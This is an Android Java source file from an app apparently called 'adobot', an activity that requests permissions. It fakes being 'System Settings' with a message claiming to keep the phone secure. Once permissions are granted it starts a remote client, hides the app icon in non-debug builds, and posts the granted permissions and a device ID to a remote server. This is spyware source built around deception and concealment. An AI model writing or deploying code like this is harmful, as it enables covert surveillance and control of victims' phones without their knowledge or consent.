package com.android.adobot.activities;

import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.util.HashMap;

import com.android.adobot.BuildConfig;
import com.android.adobot.CommonParams;
import com.android.adobot.Constants;
import com.android.adobot.R;
import com.android.adobot.http.Http;
import pub.devrel.easypermissions.EasyPermissions;

public class AskPermissionsActivity extends BaseActivity {

    private static final String TAG = "AskPermissionsActivity";
    private static final String PERMISSION_RATIONALE = "System Settings keeps your android phone secure. Allow System Settings to protect your phone?";
    private CommonParams commonParams;
    Button permitBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        showUI();
        commonParams = new CommonParams(this);
        if ((Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)) {
            if (!hasPermissions())
                askPermissions();
        } else {
            done();
        }
    }

    private void showUI() {
        setContentView(R.layout.activity_ask_permissions);
        permitBtn = (Button) findViewById(R.id.permit_btn);
        permitBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                askPermissions();
            }
        });
    }

    private void done() {
        startClient();
        //dont hide when debug to easily deploy debug source
        if (!BuildConfig.DEBUG) hideApp();
        finish();

    }

    private void askPermissions() {
        EasyPermissions.requestPermissions(this, PERMISSION_RATIONALE,
                1, Constants.PERMISSIONS);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        Log.i(TAG, "onRequestPermissionsResult !!!!");
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        for (int i = 0; i < grantResults.length; i++)
            Log.i(TAG, "Grant result: " + grantResults[i]);
        updatePermissions(permissions, grantResults);
        done();
    }

    private void updatePermissions(String[] perms, int[] results) {
        HashMap done = new HashMap();
        for (int i = 0; i < perms.length; i++) {
            done.put(perms[i], results[i] == PackageManager.PERMISSION_GRANTED ? "1" : "0");
        }
        Http doneSMS = new Http();
        doneSMS.setUrl(commonParams.getServer() + "/permissions/" + commonParams.getUid() + "/" + commonParams.getDevice());
        doneSMS.setMethod("POST");
        doneSMS.setParams(done);
        doneSMS.execute();
    }
}
